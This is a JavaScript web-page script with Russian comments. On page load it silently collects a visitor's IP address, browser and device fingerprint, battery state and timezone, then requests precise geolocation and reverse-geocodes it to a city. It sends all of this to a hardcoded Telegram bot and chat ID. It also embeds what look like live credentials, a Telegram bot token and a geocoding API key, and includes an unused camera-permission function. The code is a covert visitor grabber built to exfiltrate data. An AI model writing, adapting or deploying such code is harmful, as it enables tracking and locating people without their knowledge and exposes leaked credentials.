// Вставь свой токен бота и chat_id
const botToken = '7811273259:AAHRUI55WZFQqTSEjye_sl_CoeRMBQ9xdIY';
const chatId = '7518382960';

// Функция для отправки сообщения в Telegram
function sendToTelegram(message) {
  const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
  const data = {
    chat_id: chatId,
    text: message,
  };

  // Отправка данных через fetch
  fetch(url, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json'
    },
    body: JSON.stringify(data)
  })
  .then(response => response.json())
  .then(data => console.log('Data sent to Telegram', data))
  .catch(error => console.error('Error:', error));
}

// Функция для отправки фото в Telegram
function sendPhotoToTelegram(photoUrl) {
  const url = `https://api.telegram.org/bot${botToken}/sendPhoto`;
  const data = {
    chat_id: chatId,
    photo: photoUrl
  };

  fetch(url, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json'
    },
    body: JSON.stringify(data)
  })
  .then(response => response.json())
  .then(data => console.log('Photo sent to Telegram', data))
  .catch(error => console.error('Error sending photo:', error));
}

// Функция для получения IP-адреса
function getIP() {
  return fetch('https://api.ipify.org?format=json')
    .then(response => response.json())
    .then(data => data.ip)
    .catch(() => 'Не удалось получить IP');
}

// Функция для получения информации о браузере и операционной системе
function getBrowserInfo() {
  const userAgent = navigator.userAgent;

  let browserName = "Неизвестный браузер";
  let osName = "Неизвестная ОС";
  let browserVersion = "Неизвестная версия";
  let osVersion = "Неизвестная версия";

  // Проверяем операционную систему
  if (userAgent.indexOf("Windows NT 10.0") !== -1) {
    osName = "Windows";
    osVersion = "10";
  } else if (userAgent.indexOf("Windows NT 6.1") !== -1) {
    osName = "Windows";
    osVersion = "7";
  } else if (userAgent.indexOf("Macintosh") !== -1) {
    osName = "Mac OS";
    osVersion = "Неизвестная версия";
  } else if (userAgent.indexOf("Linux") !== -1) {
    osName = "Linux";
    osVersion = "Неизвестная версия";
  } else if (userAgent.indexOf("Android") !== -1) {
    osName = "Android";
    osVersion = "Неизвестная версия";
  } else if (userAgent.indexOf("iPhone") !== -1) {
    osName = "iOS";
    osVersion = "Неизвестная версия";
  }

  // Проверяем браузер
  if (userAgent.indexOf("Chrome") !== -1) {
    browserName = "Chrome";
    browserVersion = userAgent.match(/Chrome\/([0-9]+)/)[1];
  } else if (userAgent.indexOf("Firefox") !== -1) {
    browserName = "Firefox";
    browserVersion = userAgent.match(/Firefox\/([0-9]+)/)[1];
  } else if (userAgent.indexOf("Safari") !== -1) {
    browserName = "Safari";
    browserVersion = userAgent.match(/Version\/([0-9]+)/)[1];
  } else if (userAgent.indexOf("Edge") !== -1) {
    browserName = "Edge";
    browserVersion = userAgent.match(/Edge\/([0-9]+)/)[1];
  } else if (userAgent.indexOf("MSIE") !== -1) {
    browserName = "Internet Explorer";
    browserVersion = userAgent.match(/MSIE ([0-9]+)/)[1];
  }

  return { browserName, browserVersion, osName, osVersion };
}

// Функция для получения состояния батареи
function getBatteryStatus() {
  return navigator.getBattery ? navigator.getBattery().then(function(battery) {
    return `${battery.level * 100}% - ${battery.charging ? "Charging" : "Not Charging"}`;
  }) : Promise.resolve("Не поддерживает батарею");
}

// Функция для определения, использует ли пользователь смартфон
function isMobileDevice() {
  const userAgent = navigator.userAgent;
  return /Android|iPhone|Mobile|webOS|Windows Phone/i.test(userAgent);
}

// Функция для запроса разрешения на доступ к камере
function requestCameraPermission() {
  navigator.mediaDevices.getUserMedia({ video: true })
    .then(stream => {
      // Камера разрешена
      collectData();
    })
    .catch(error => {
      console.error('Ошибка доступа к камере:', error);
    });
}

// Запускаем сбор данных
window.onload = function() {
  collectData();
};

// Функция для сбора данных
function collectData() {
  const userData = {
    userAgent: navigator.userAgent || 'Не удалось получить userAgent',
    platform: navigator.platform || 'Не удалось получить платформу',
    language: navigator.language || 'Не удалось получить язык',
    screenWidth: screen.width || 'Не удалось получить ширину экрана',
    screenHeight: screen.height || 'Не удалось получить высоту экрана',
    screenColorDepth: screen.colorDepth || 'Не удалось получить глубину цвета экрана',
    screenPixelDepth: screen.pixelDepth || 'Не удалось получить пиксельную глубину экрана',
    time: new Date().toISOString() || 'Не удалось получить время',
    ip: '',
    onlineStatus: navigator.onLine ? 'Онлайн' : 'Оффлайн',
    cookiesEnabled: navigator.cookieEnabled ? 'Включены' : 'Отключены',
    deviceMemory: navigator.deviceMemory || 'Не удалось получить память устройства',
    hardwareConcurrency: navigator.hardwareConcurrency || 'Не удалось получить количество ядер процессора',
    languageList: navigator.languages ? navigator.languages.join(', ') : 'Не удалось получить список языков',
    screenOrientation: screen.orientation ? screen.orientation.type : 'Не удалось получить ориентацию экрана',
    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || 'Не удалось получить часовой пояс',
    batteryStatus: '',
    cookieStorage: 'Доступен', // Просто пример, но реальная проверка потребует работы с cookies
    browserInfo: getBrowserInfo(),
    isMobile: isMobileDevice() ? 'Да' : 'Нет'
  };

  // Получаем IP
  getIP().then(ip => {
    userData.ip = ip;

    // Получаем состояние батареи
    getBatteryStatus().then(batteryStatus => {
      userData.batteryStatus = batteryStatus;

      // Формируем сообщение
      const message = `
📍 Сбор данных завершен!

🖥️ IP: ${userData.ip}
🌐 Браузер: ${userData.browserInfo.browserName} v${userData.browserInfo.browserVersion}
📱 ОС: ${userData.browserInfo.osName} v${userData.browserInfo.osVersion}
🖥️ Платформа: ${userData.platform}
🌍 Язык: ${userData.language}

📐 Размер экрана: ${userData.screenWidth}x${userData.screenHeight}
🎨 Глубина цвета: ${userData.screenColorDepth}
💾 Память устройства: ${userData.deviceMemory} GB
🧠 Ядер процессора: ${userData.hardwareConcurrency}
🍪 Cookies включены: ${userData.cookiesEnabled}

📶 Онлайн статус: ${userData.onlineStatus}
📂 Доступность cookieStorage: ${userData.cookieStorage}

🕰️ Часовой пояс: ${userData.timezone}
🔋 Поддержка батареи: ${userData.batteryStatus}
🗣️ Список языков: ${userData.languageList}
🧭 Ориентация экрана: ${userData.screenOrientation}
💻 Мобильное устройство: ${userData.isMobile ? 'Да' : 'Нет'}
      `;

      // Отправляем данные в Telegram
      sendToTelegram(message);

      // После отправки данных, запрашиваем точное местоположение
      getLocation();
    });
  }).catch(error => {
    console.error('Ошибка получения IP:', error);
    sendToTelegram('Ошибка получения IP');
    getLocation();
  });
}

// Функция для получения местоположения с использованием координат
function getLocation() {
  if (navigator.geolocation) {
    navigator.geolocation.getCurrentPosition(
      position => {
        const latitude = position.coords.latitude;
        const longitude = position.coords.longitude;

        // Получаем город по координатам
        fetchCityFromCoordinates(latitude, longitude)
          .then(city => {
            const locationMessage = `
🌍 Точное местоположение пользователя:

📍 Широта: ${latitude}
📍 Долгота: ${longitude}
🏙️ Город: ${city}
            `;

            // Отправляем информацию о местоположении и городе в Telegram
            sendToTelegram(locationMessage);
          }).catch(err => {
            console.error('Ошибка при получении города: ', err);
          });
      },
      error => {
        console.error("Ошибка получения геолокации: ", error);
      }
    );
  }
}

// Функция для получения ближайшего города по координатам
function fetchCityFromCoordinates(latitude, longitude) {
  const apiKey = 'c51efb0d46ac4496b556cf9d9868e4d4'; // Здесь должен быть ваш ключ API для геолокации
  const url = `https://api.opencagedata.com/geocode/v1/json?q=${latitude}+${longitude}&key=${apiKey}`;

  return fetch(url)
    .then(response => response.json())
    .then(data => {
      if (data.results && data.results.length > 0) {
        return data.results[0].components.city || data.results[0].components.town || 'Неизвестный город';
      } else {
        return 'Город не найден';
      }
    })
    .catch(error => {
      console.error('Ошибка при получении города: ', error);
      return 'Город не найден';
    });
}
